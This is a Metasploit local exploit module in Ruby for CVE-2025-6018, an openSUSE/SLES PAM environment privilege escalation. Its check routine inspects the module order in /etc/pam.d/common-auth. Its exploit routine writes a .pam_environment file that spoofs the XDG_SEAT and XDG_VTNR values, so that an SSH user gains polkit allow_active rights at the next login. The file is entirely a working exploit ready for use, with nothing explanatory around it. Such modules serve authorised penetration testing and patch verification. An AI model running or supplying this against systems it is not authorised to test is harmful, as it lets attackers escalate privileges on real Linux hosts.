##
# CVE-2025-6018 Metasploit Module - PAM Environment Privilege Escalation
##
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'openSUSE/SUSE PAM Environment Privilege Escalation',
      'Description'    => %q{
        Exploits improper PAM module order/configuration in openSUSE Leap 15 / SLES 15 allowing unprivileged
        users (such as via SSH) to escalate to polkit allow_active users.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Qualys Security Advisory'],
      'Platform'       => ['linux'],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'References'     => [['CVE', '2025-6018']],
      'DisclosureDate' => '2025-06-17'
    ))
  end

  def check
    pam_auth = read_file('/etc/pam.d/common-auth')
    return CheckCode::Safe unless pam_auth&.include?('pam_env.so') && pam_auth.include?('pam_systemd.so')

    env_pos = pam_auth.index('pam_env.so')
    systemd_pos = pam_auth.index('pam_systemd.so')

    return CheckCode::Vulnerable if env_pos && systemd_pos && env_pos < systemd_pos

    CheckCode::Safe
  end

  def exploit
    home = cmd_exec('sh -c "echo $HOME"').strip
    pam_env_path = File.join(home, '.pam_environment')

    print_status("Writing malicious PAM environment to #{pam_env_path}")
    pam_payload = "XDG_SEAT OVERRIDE=seat0\nXDG_VTNR OVERRIDE=1\n"

    write_file(pam_env_path, pam_payload)

    print_good(".pam_environment written successfully. Privileges escalate upon next login.")
    print_status("You must reconnect or trigger a new PAM session to obtain allow_active privileges.")
  end
end
